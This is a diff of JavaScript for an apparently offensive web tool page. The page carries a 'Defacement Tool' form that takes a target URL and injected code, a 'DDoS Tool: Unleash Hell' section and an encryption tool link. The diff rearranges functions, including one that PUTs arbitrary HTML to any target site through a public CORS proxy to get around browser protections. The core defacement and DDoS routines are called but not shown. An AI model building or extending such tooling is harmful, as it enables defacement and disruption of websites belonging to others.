@@ -122,22 +122,38 @@ async function performDefacement(targetURL, defacementCode) {
     }
 }
 
-// Event listener for deface button click
-document.getElementById("defaceButton").addEventListener("click", async function () {
-    const targetURL = document.getElementById("targetURL").value;
-    const defacementCode = document.getElementById("defacementCode").value;
+// Add form for target URL and defacement code
+function addDefacementForm() {
+    const formDiv = document.createElement('div');
+    formDiv.innerHTML = `
+ <h2>Defacement Tool</h2>
+ <label for="targetURL">Target URL:</label><br>
+ <input type="text" id="targetURL" name="targetURL" style="width:100%;"><br><br>
+ <label for="defacementCode">Defacement Code:</label><br>
+ <textarea id="defacementCode" name="defacementCode" rows="10" cols="50" style="width:100%;"></textarea><br><br>
+ <button id="defaceButton">Deface Website</button>
+ `;
+    document.body.appendChild(formDiv);
 
-    if (!targetURL || !defacementCode) {
-        alert("ENTER A TARGET AND SOME FUCKING CODE, YA MORON.");
-        logAction("User failed to enter target URL or defacement code.");
-        return;
-    }
+    // Event listener for deface button click
+    document.getElementById("defaceButton").addEventListener("click", async function () {
+        const targetURL = document.getElementById("targetURL").value;
+        const defacementCode = document.getElementById("defacementCode").value;
 
-    logAction(`Target URL: ${targetURL}`);
-    logAction(`Defacement Code: ${defacementCode}`);
+        if (!targetURL || !defacementCode) {
+            alert("ENTER A TARGET AND SOME FUCKING CODE, YA MORON.");
+            logAction("User failed to enter target URL or defacement code.");
+            return;
+        }
 
-    await performDefacement(targetURL, defacementCode);
-});
+        logAction(`Target URL: ${targetURL}`);
+        logAction(`Defacement Code: ${defacementCode}`);
+
+        await performDefacement(targetURL, defacementCode);
+    });
+}
+
+addDefacementForm();
 
 // Educational Information
 const defacementInfo = `
@@ -158,7 +174,81 @@ const infoElement = document.createElement("div");
 infoElement.innerHTML = defacementInfo;
 document.body.appendChild(infoElement);
 
+// Function to add backup functionality
+async function backupWebsite(targetURL) {
+    try {
+        logAction("Backing up website content...");
+        const backupContent = await fetchWithCORS(targetURL);
+        const backupBlob = new Blob([backupContent], { type: "text/html" });
+        const backupLink = document.createElement("a");
+        backupLink.href = URL.createObjectURL(backupBlob);
+        backupLink.download = "website_backup.html";
+        backupLink.click();
+        logAction("Backup completed.");
+    } catch (error) {
+        console.error("Error during backup:", error);
+        alert("Backup failed, you fucking idiot.");
+        logAction(`Error during backup: ${error}`);
+    }
+}
 
+// Function to add restore functionality
+async function restoreWebsite(targetURL) {
+    const backupURL = "website_backup.html";
+
+    try {
+        logAction("Attempting to restore website...");
+        const backupResponse = await fetch(backupURL, { mode: 'cors' });
+        const backupContent = await backupResponse.text();
+
+         // Use a proxy to bypass CORS for PUT requests
+         const corsProxy = 'https://corsproxy.io/?';
+         const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
+
+         const response = await fetch(proxiedUrl, {
+             method: 'PUT',
+             mode: 'cors',  // Explicitly set CORS mode
+             headers: {
+                 'Content-Type': 'text/html',
+                 'Origin': window.location.origin,  // Include origin header
+                 'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
+             },
+             body: backupContent,
+         });
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+
+        logAction("Website restoration completed for: " + targetURL);
+    } catch (error) {
+        console.error("Error during restoration:", error);
+        alert("Restoration failed, you fucking idiot.");
+        logAction(`Error during restoration: ${error}`);
+    }
+}
+
+// Add preview functionality
+function addPreview() {
+    const previewDiv = document.createElement('div');
+    previewDiv.innerHTML = `
+ <h2>Preview</h2>
+ <iframe id="previewFrame" style="width:100%;height:300px;background-color:white;"></iframe>
+ `;
+    document.body.appendChild(previewDiv);
+}
+
+addPreview();
+
+// Validate URL
+function isValidURL(str) {
+    try {
+        new URL(str);
+        return true;
+    } catch (_) {
+        return false;
+    }
+}
 
 // Security Headers (Gotta protect ourselves, right?)
 function setSecurityHeaders() {
@@ -433,16 +523,6 @@ function addSidebar() {
 // Run addSidebar
 addSidebar();
 
-// Auto Reload (refresh every 10 seconds)
-function autoReload() {
-    setTimeout(function () {
-        location.reload();
-    }, 10000);
-}
-
-// Run autoReload
-autoReload();
-
 // Educational information for DDoS
 const ddosInfo = `
  <h2>DDoS Tool: Unleash Hell</h2>
@@ -495,87 +575,6 @@ function redirectToDeface() {
     window.location.href = "/defacement";
 }
 
-// Add Navbar (Already added, but keeping the function)
-
-// Add Sidebar
-function addSidebar() {
-    const sidebar = document.createElement('aside');
-    sidebar.style.cssText = `
- position: fixed;
- top: 50%;
- left: 0;
- transform: translateY(-50%);
- width: 150px;
- background-color: rgba(0, 0, 0, 0.8);
- padding: 20px;
- z-index: 10001;
- display: flex;
- flex-direction: column;
- align-items: center;
- `;
-
-    const sidebarTitle = document.createElement('span');
-    sidebarTitle.textContent = 'Tools';
-    sidebarTitle.style.cssText = `
- color: white;
- font-size: 1.2em;
- font-weight: bold;
- margin-bottom: 15px;
- `;
-    sidebar.appendChild(sidebarTitle);
-
-    const defaceButtonSidebar = document.createElement('button');
-    defaceButtonSidebar.textContent = 'Defacement';
-    defaceButtonSidebar.style.cssText = `
- padding: 10px;
- background-color: darkred;
- color: white;
- border: none;
- cursor: pointer;
- margin-bottom: 10px;
- `;
-    defaceButtonSidebar.addEventListener('click', () => {
-        // Redirect or show defacement tool section
-        redirectToDeface();
-    });
-    sidebar.appendChild(defaceButtonSidebar);
-
-    const ddosButtonSidebar = document.createElement('button');
-    ddosButtonSidebar.textContent = 'DDoS';
-    ddosButtonSidebar.style.cssText = `
- padding: 10px;
- background-color: darkred;
- color: white;
- border: none;
- cursor: pointer;
- margin-bottom: 10px;
- `;
-    ddosButtonSidebar.addEventListener('click', () => {
-        // Redirect or show DDoS tool section
-        redirectToDDOS();
-    });
-    sidebar.appendChild(ddosButtonSidebar);
-
-    const encryptButtonSidebar = document.createElement('button');
-    encryptButtonSidebar.textContent = 'Encryption';
-    encryptButtonSidebar.style.cssText = `
- padding: 10px;
- background-color: darkred;
- color: white;
- border: none;
- cursor: pointer;
- `;
-    encryptButtonSidebar.addEventListener('click', () => {
-        // Redirect or show File Encryption tool section
-        redirectToEncryptionTool();
-    });
-    sidebar.appendChild(encryptButtonSidebar);
-
-    document.body.appendChild(sidebar);
-}
-
-// Run addSidebar (Already added, but keeping the function)
-
 // Auto Reload (refresh every 10 seconds)
 function autoReload() {
     setTimeout(function () {
@@ -584,6 +583,7 @@ function autoReload() {
 }
 
 // Run autoReload
+autoReload();
 
 // Function to add Navbar links
 function addNavbarLinks() {
@@ -621,60 +621,6 @@ function addNavbarLinks() {
 }
 
 addNavbarLinks();
-
-// Function to add backup functionality
-async function backupWebsite(targetURL) {
-    try {
-        logAction("Backing up website content...");
-        const backupContent = await fetchWithCORS(targetURL);
-        const backupBlob = new Blob([backupContent], { type: "text/html" });
-        const backupLink = document.createElement("a");
-        backupLink.href = URL.createObjectURL(backupBlob);
-        backupLink.download = "website_backup.html";
-        backupLink.click();
-        logAction("Backup completed.");
-    } catch (error) {
-        console.error("Error during backup:", error);
-        alert("Backup failed, you fucking idiot.");
-        logAction(`Error during backup: ${error}`);
-    }
-}
-
-// Function to add restore functionality
-async function restoreWebsite(targetURL) {
-    const backupURL = "website_backup.html";
-
-    try {
-        logAction("Attempting to restore website...");
-        const backupResponse = await fetch(backupURL, { mode: 'cors' });
-        const backupContent = await backupResponse.text();
-
-         // Use a proxy to bypass CORS for PUT requests
-         const corsProxy = 'https://corsproxy.io/?';
-         const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
-
-         const response = await fetch(proxiedUrl, {
-             method: 'PUT',
-             mode: 'cors',  // Explicitly set CORS mode
-             headers: {
-                 'Content-Type': 'text/html',
-                 'Origin': window.location.origin,  // Include origin header
-                 'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
-             },
-             body: backupContent,
-         });
-
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-
-        logAction("Website restoration completed for: " + targetURL);
-    } catch (error) {
-        console.error("Error during restoration:", error);
-        alert("Restoration failed, you fucking idiot.");
-        logAction(`Error during restoration: ${error}`);
-    }
-}
 
 // Add Backup button to the Navbar
 function addBackupButtonNavbar() {
@@ -779,61 +725,6 @@ window.onerror = function (message, source, lineno, colno, error) {
     alert(`An error occurred: ${message}. Check the console, DIPSHIT.`);
     logAction(`Global error: ${message} at line ${lineno}`);
 };
-
-// Add preview functionality
-function addPreview() {
-    const previewDiv = document.createElement('div');
-    previewDiv.innerHTML = `
- <h2>Preview</h2>
- <iframe id="previewFrame" style="width:100%;height:300px;background-color:white;"></iframe>
- `;
-    document.body.appendChild(previewDiv);
-}
-
-addPreview();
-
-// Validate URL
-function isValidURL(str) {
-    try {
-        new URL(str);
-        return true;
-    } catch (_) {
-        return false;
-    }
-}
-
-// Add form for target URL and defacement code
-function addDefacementForm() {
-    const formDiv = document.createElement('div');
-    formDiv.innerHTML = `
- <h2>Defacement Tool</h2>
- <label for="targetURL">Target URL:</label><br>
- <input type="text" id="targetURL" name="targetURL" style="width:100%;"><br><br>
- <label for="defacementCode">Defacement Code:</label><br>
- <textarea id="defacementCode" name="defacementCode" rows="10" cols="50" style="width:100%;"></textarea><br><br>
- <button id="defaceButton">Deface Website</button>
- `;
-    document.body.appendChild(formDiv);
-
-    // Event listener for deface button click
-    document.getElementById("defaceButton").addEventListener("click", async function () {
-        const targetURL = document.getElementById("targetURL").value;
-        const defacementCode = document.getElementById("defacementCode").value;
-
-        if (!targetURL || !defacementCode) {
-            alert("ENTER A TARGET AND SOME FUCKING CODE, YA MORON.");
-            logAction("User failed to enter target URL or defacement code.");
-            return;
-        }
-
-        logAction(`Target URL: ${targetURL}`);
-        logAction(`Defacement Code: ${defacementCode}`);
-
-        await performDefacement(targetURL, defacementCode);
-    });
-}
-
-addDefacementForm();
 
 // Add CSS styles for better appearance
 function addStyles() {
